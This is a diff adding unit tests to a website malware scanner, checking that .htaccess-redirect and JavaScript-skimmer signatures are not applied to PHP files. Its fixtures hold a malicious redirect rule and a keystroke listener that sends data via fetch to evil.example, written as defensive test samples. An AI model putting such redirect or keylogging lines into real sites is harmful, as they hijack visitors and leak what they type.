@@ -374,6 +374,20 @@ class ScannerTests(unittest.TestCase):
             self.assertEqual(result.status, ScanStatus.COMPLETED.value)
             self.assertFalse(any(f.signature_id in {'WP122', 'WP123', 'WP124'} for f in result.findings))
 
+    def test_scan_file_does_not_apply_htaccess_signature_to_php_file(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "redir.php"
+            target.write_text(
+                "<?php\n"
+                "// RewriteRule ^(.*)$ https://evil.example/$1 [R=302,L]\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertFalse(any(f.signature_id == "WP123" for f in result.findings))
+
     def test_scan_file_detects_js_payment_form_exfiltration(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
@@ -413,6 +427,20 @@ class ScannerTests(unittest.TestCase):
                 "form.addEventListener('submit', function(){\n"
                 "  console.log('submitted');\n"
                 "});\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertFalse(any(f.signature_id in {'WP125', 'WP126', 'WP127'} for f in result.findings))
+
+    def test_scan_file_does_not_apply_js_skimmer_signatures_to_php(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "script.php"
+            target.write_text(
+                "<?php\n"
+                "echo \"document.addEventListener('keydown', function(e){ fetch('https://evil.example/k'); });\";\n",
                 encoding="utf-8",
             )
 
